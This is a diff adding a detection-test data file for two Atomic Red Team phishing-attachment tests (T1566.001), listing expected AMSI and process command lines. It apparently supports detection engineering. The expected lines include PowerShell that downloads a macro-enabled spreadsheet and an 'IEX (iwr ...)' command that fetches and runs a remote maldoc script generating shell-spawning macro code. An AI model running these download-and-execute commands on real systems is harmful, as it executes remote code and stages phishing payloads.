@@ -1,0 +1,14 @@
+T1566.001,windows,114ccff9,Download Macro-Enabled Phishing Attachment
+_E_,AMSI,scan_content~=$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+_E_,AMSI,scan_content~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+_E_,AMSI,scan_content~=Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
+
+T1566.001,windows,cbb6799a,Word spawned a command shell and used an IP address in the command line
+FYI,Test fails
+ARG,jse_path,C:\Users\Public\art.jse
+ARG,ms_product,Word
+_E_,Process,cmdline~=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+_E_,Process,cmdline~=IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+_E_,Process,cmdline~=$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
+_E_,Process,cmdline~=Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
+
